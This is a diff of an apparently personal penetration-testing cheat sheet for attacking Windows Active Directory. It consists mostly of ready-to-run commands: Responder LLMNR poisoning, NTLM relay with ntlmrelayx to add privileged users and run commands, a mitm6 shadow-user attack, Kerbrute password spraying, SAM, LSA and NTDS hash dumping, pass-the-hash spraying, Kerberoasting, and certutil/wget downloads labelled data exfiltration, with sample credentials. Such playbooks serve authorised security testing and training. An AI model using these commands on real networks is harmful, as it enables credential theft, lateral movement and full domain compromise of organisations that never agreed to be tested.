@@ -1,33 +1,106 @@
-# Windows Active Directory Attack Steps
-## First Strike (SMB)
+This document is meant to serve as a specialized guide to enumerating and attacking different services commonly used alongside active directory by providing tools, commands, and context.
+# Windows Active Directory Recon
+## Scanning & Enumeration
+### Operating System Commands
+Basic Enumeration with OS Commands:
+- `net user /domain` - List all domain users.
+- `net group /domain` - List all domain groups.
+- `net group "Domain Admins" /domain` - List members of the Domain Admins group.
+- `net localgroup administrators` - Check for domain users in the local administrators group (look for the domain prefix, e.g., `CORP\jsmith`).
+- `nltest /domain_trusts` - Enumerate domain trusts.
+### SMB
+##### Enum4linux
+Enumerate Windows SMB information. 
+`enum4linux 10.10.132.224 -UMSP`
+-> Enumerates users, anonymous login, domain SID, and more. Perfect for determining a host's domain name.
+### LDAP
+See [[LDAP]] for comprehensive information and resource links.
+>> "As a penetration tester, ignoring AD typically results in leaving a massive attack surface on the table. At the same time, organizations not implementing (or with weak) AD security also open themselves up to a plethora of attacks." [4](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)
+#### Tools
+##### Nmap
+No credentials, see what can be pulled.
+```
+nmap -n -sV --script "ldap* and not brute" <IP>  
+```
+##### ldapdomaindump
+```
+# With Credentials
+ldapdomaindump -u security.local\\<User> -p '<Password>' ldap://<IP>
+
+# Without credentials
+ldapdomaindump ldap://<IP>
+```
+##### ldapsearch
+```
+# Get all users
+ldapsearch -x -H ldap://<IP> -D '<Domain>\<User>' -w '<Password>' -b 'DC=security,DC=local'
+
+# Get all users and cleanup output
+ldapsearch -x -H ldap://<IP> -D '<Domain>\<User>' -w '<Password>' -b 'DC=security,DC=local' | grep userPrincipalName | sed 's/userPrincipalName: //'
+
+# Without credentials
+ldapsearch -x -H ldap://<IP> -b 'DC=security,DC=local'
+ldapsearch -x -H ldap://<IP> -b 'DC=security,DC=local' | grep userPrincipalName | sed 's/userPrincipalName: //'
+```
+##### Metasploit
+```
+use auxiliary/gather/ldap_hashdump
+```
+##### Crackmapexec
+```
+crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> --admin-count
+crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --asreproast ASREPROAST
+crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --groups
+crackmapexec ldap'<IP> -u <User> -p <Password> --kdcHost <Host>  --kerberoasting KERBEROASTING
+crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --password-not-required
+crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --trusted-for-delegation
+crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --users
+
+# Modules
+crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> -M get-desc-users
+crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> -M laps
+crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> -M ldap-signing
+```
+### Antivirus
+See [[Abusing Exclusions To Evade Detection _ Dazzy Ddos.pdf]]
+1. `sc query windefend`
+>Query the Service Control Manager for Windows Defender
+>>I couldn't find a list of Anti-Virus service names online :(
+2. `nxc smb <ip> -u user -p pass -M enum_av`
+### Domain SID
+1. `nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid`
+2. `whoami /user`
+3. PowerShell(Requires Active Directory Module)
+	1. Direct retrieval: `(Get-ADDomain).DomainSID.Value`
+	2. From user object: `(Get-ADUser "Username").SID.AccountDomainSID`
+
+---
+# Uncredentialed Initial Attack Vectors
+## First Strike (NTLM Relay, SMB)
 1. **Obtain an NTLMv2 Hash via Responder:** `sudo responder -I eth0 -dw`
 	- LLMNR Poisoning via `responder` captures NTLMv2 hashes whenever any user tries accessing a machine/file/share and mistypes the IP or hostname.
 		- Great to run when computers are logging in, like 8AM, or lunchtime.
 		- (Reminder) Entire Hash format required: `username::DOMAIN:string:string:string`
 		- Attempt cracking NTLMv2 hash: `hashcat -m 5600 luvrgirl.ntlmv2hashes /usr/share/wordlists/rockyou.txt`
 	- **If the hash is not crackable, move to step 2.**
-
 2. **Check for SMB signing requirements with [NetExec](https://www.netexec.wiki/):** `nxc smb 10.0.2.0/24 --gen-relay targets.txt`
 	- **Relay to LDAP:** Auto-dump domain users, groups, and computers: `ntlmrelayx.py -t ldap://DC_IP --add-computer workstation20 --delegate-access`
 		- Add user to **Domain Admins** or other privileged group: `ntlmrelayx.py -t ldap://DC_IP --escalate-user USERNAME`
-
 3. **Dump Local Security Authority (LSA):** `nxc smb 10.0.2.9 -u luvrgirl -p Password --lsa` 
 	- Attempt cracking DCC2 Hashes: `.\hashcat.exe -m 2100 hash.txt rockyou.txt -O`
 		- DCC2 Hash format must be as such in file: `$DCC2$10240#administrator#c7154f935b7d1ace4c1d72bd4fb7889c`
-
 4. **Dump Security Account Manager:** `nxc smb 10.0.2.9 -u luvrgirl -p Password1 --sam`
-
 5. **Move Laterally:** with NetExec
 	- Password Spraying: `nxc smb 10.0.2.0/24 -u luvrgirl -p 'Password1'` 
 	- *Check for Local Admin Password reuse* via Hash Spraying: `nxc smb 10.0.2.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 --local-auth`  
----
-# AD Initial Attack Vectors
-## Responder
+### Tools
+> Commonly used tools and commands
+#### Responder
 `sudo responder -I eth0 -dw`
 > Capture NTLMv2 hashes: WPAD rogue proxy server w/ DHCP broadcast request answering
 
 If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network.
-## SMB Relay via ntlmrelayx
+#### SMB Relay via ntlmrelayx
 > If you cannot crack hashes gathered w/ Responder, you can relay those hashes to attempt gaining access
 
 **Steps**:
@@ -38,9 +111,8 @@ If any user in the network tries to access a machine and mistype the IP or the n
 4. Run ntlmrelay: `ntlmrelayx.py -tf targets.txt -smb2support`
 	- Dumps SAM/Captures NTLMv1 hashes
 		- Optionally, run commands directly: `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
-## MITM6 - Create a shadow user
+#### MITM6 - Create a shadow user
 >If IPv6 is not in use in the environment, you can attack LDAP using ntlmrelayx/mitm6 combo.
-
 1. Start ntlmrelayx: `ntlmrelayx.py -6 -t ldaps://10.0.2.7 -wh wpad.lifeline.local -l lootme`
 2. Start mitm6: `sudo mitm6 -d lifeline.local`
 
@@ -64,9 +136,30 @@ TypeName: {'ACCESS_ALLOWED_ACE'}
 [*] User privileges found: Modifying domain ACL
 [*] Adding new user with username: qmsgntJvqi and password: V&Vr|.3[U67`C~Y result: OK
 ```
-# AD Internal Enumeration with Compromised Credentials
-## Bloodhound & Neo4j
-> **REQUIRES**: compromised domain user (Active Directory username & password)
+#### Kerbrute
+`kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results`
+> Enumerate Active Directory users to compile a list of valid password-spraying targets
+
+`kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`
+> Perform a password spraying attack using the Kerbrute tool
+
+#### Secretsdump.py
+`secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss`
+>Dump the NTDS Active Directory database to retrieve NTLM password hashes for all domain users for offline cracking
+#### PowerShell
+| `Import-Module ActiveDirectory`                                | Load the built-in Active Directory PowerShell module on a Windows host                                          |     |
+| -------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- | --- |
+| `Get-ADUser -Filter * \| select Name`                          | List all domain users using the Active Directory PowerShell module Get-ADUser cmdlet and filter by the username |     |
+| `Get-DomainUser * \| Select-Object samaccountname,description` | Check the description field of all domain users for sensitive data such as passwords                            |     |
+### Another Perspective on Uncredentialed Lateral Movement
+See [[Penetration Test Playbook#Uncredentialed Lateral Movement]]
+> Source: [4](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)
+
+---
+# Internal Enumeration with Compromised Credentials
+## Post-Compromise Attacks
+### Domain Mapping w/ Bloodhound & Neo4j
+> **REQUIRES**: Active Directory domain user credentials (Active Directory username & password)
 
 Steps: 
 1. Update Bloodhound via APT or Pip, whichever it was installed with
@@ -75,12 +168,11 @@ Steps:
 3. Run Bloodhound: `sudo bloodhound`
 4. Use bloodhound-python to enumerate the active directory environment via compromised credentials: `sudo bloodhound-python -d LIFELINE.local -u mmeow -p Password1 -ns 10.0.2.7 -c all` *(nameserver must be domain)*
 5. Upload all JSON files created to Bloodhound's web interface. You're now ready to visualize the environment for enumeration
-# AD Post-Compromise Attacks
 ## File Transfers
 #### Host
 - HTTP: `python3 -m http.server 8080`
 - FTP: `python3 -m pyftpdlib -p 21`
-#### Grab
+#### Data Exfiltration
 - Certutil: `certutil.exe --urlcache -f http://10.0.2.15/file.txt file.txt`
 - Wget: `wget 10.0.2.15/file.txt`
 ## Dump Hashes
@@ -125,7 +217,7 @@ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
 2. `net group "Domain Admins" <username> /ADD /DOMAIN`
 ### Golden Tickets
 You may wish to simply review [[Golden Diamond and Sapphire Attacks]] for technological details.
-#### Dump Service Principal Names 
+#### Dump Service Principal Names (Kerberoasting)
 > Fetch Service Principal Names that are associated with normal user accounts, NOT machines. User generated SPNs are based on user-created  passwords, which means they're weaker, which means they can actually be cracked.
 
 `sudo GetUserSPNs.py LIFELINE.local/mmeow:Password1 -dc-ip 10.0.2.7 -request`
@@ -152,7 +244,9 @@ It may be helpful to check which user you are when first landing in a Meterprete
 ---
 # Resources
 1. https://www.netexec.wiki/smb-protocol/obtaining-credentials
-2. 
+2. https://www.netexec.wiki/ldap-protocol/find-domain-sid
+3. https://dazzyddos.github.io/posts/Abusing_Exclusions_To_Evade_Detection/
+4. https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide
 
 
-#windows #meterpreter #lateral-movement #persistence #mimikatz #security-account-manager #local-security-authority #sam #lsa #netexec #domain-sid #kerberos #kerberoasting 
+#windows #meterpreter #lateral-movement #persistence #mimikatz #security-account-manager #local-security-authority #sam #lsa #netexec #domain-sid #kerberos #kerberoasting #data-exfiltration #post-exploitation #recon #uncredentialed-access #credentialed-access #metasploit 
